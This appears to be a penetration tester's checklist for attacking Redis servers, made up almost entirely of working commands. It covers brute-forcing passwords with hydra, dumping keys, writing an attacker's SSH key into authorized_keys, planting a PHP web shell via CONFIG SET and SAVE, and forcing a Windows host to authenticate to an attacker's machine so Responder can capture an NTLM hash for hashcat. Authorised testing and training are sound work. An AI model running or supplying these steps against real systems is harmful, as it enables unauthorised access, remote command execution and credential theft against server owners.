# Redis enumeration

## Connect
sudo nmap -sV -p 6379 --script redis-info <TargetIP>
redis-cli -h <TargetIP>
redis-cli -h <TargetIP> -a '<Password>'
redis-cli -h <TargetIP> --user '<Username>' --pass '<Password>'
- [ ] NOAUTH Authentication required: a password from loot, or hydra
hydra -P /usr/share/wordlists/rockyou.txt redis://<TargetIP>

## Look around
INFO server
CONFIG GET *
INFO keyspace
SELECT 0
KEYS *
TYPE THE-KEY
GET THE-KEY
- [ ] Not a string: HGETALL for a hash, LRANGE THE-KEY 0 -1 for a list, SMEMBERS for a set
- [ ] The version, the OS and the config file, from INFO server
- [ ] CONFIG GET dir and CONFIG GET dbfilename written down, to put back afterwards
- [ ] Redis 7 refuses CONFIG SET dir by default, as a protected config: then the writes below are closed

## An SSH key into a home folder
ssh-keygen -t ed25519 -f ./redis_key -N ''
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
cat key.txt | redis-cli -h <TargetIP> -x set pwn
redis-cli -h <TargetIP> CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h <TargetIP> CONFIG SET dbfilename authorized_keys
redis-cli -h <TargetIP> SAVE
ssh -i redis_key redis@<TargetIP>
- [ ] The redis user's home is often /var/lib/redis, the parent of CONFIG GET dir: root's is /root, then ssh as root
- [ ] CONFIG SET dir fails on a folder that does not exist, so .ssh must be there already

## A web shell instead
redis-cli -h <TargetIP> CONFIG SET dir /var/www/html
redis-cli -h <TargetIP> CONFIG SET dbfilename cmd.php
redis-cli -h <TargetIP> set pwn '<?php system($_GET["cmd"]); ?>'
redis-cli -h <TargetIP> SAVE
curl -s --output - '<Scheme>://<WebHost>/cmd.php?cmd=id'
- [ ] The web root found first, from the web server's config or its error pages
- [ ] Commands run: a reverse shell, :Pb shells

## Windows: read files and capture a hash
Older Redis on Windows runs Lua's dofile. Inside redis-cli, each \ in THE-FILE-PATH is written as four:
EVAL "dofile('THE-FILE-PATH')" 0
- [ ] The file's first line comes back in the error
With Responder listening, a UNC path makes the service account log in to me:
sudo responder -I tun0
EVAL "dofile('\\\\\\\\<LHOST>\\\\share\\\\x')" 0
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

## Afterwards
redis-cli -h <TargetIP> CONFIG SET dir THE-OLD-DIR
redis-cli -h <TargetIP> CONFIG SET dbfilename dump.rdb
redis-cli -h <TargetIP> del pwn
- [ ] dbfilename set back to what CONFIG GET showed, if it was not dump.rdb
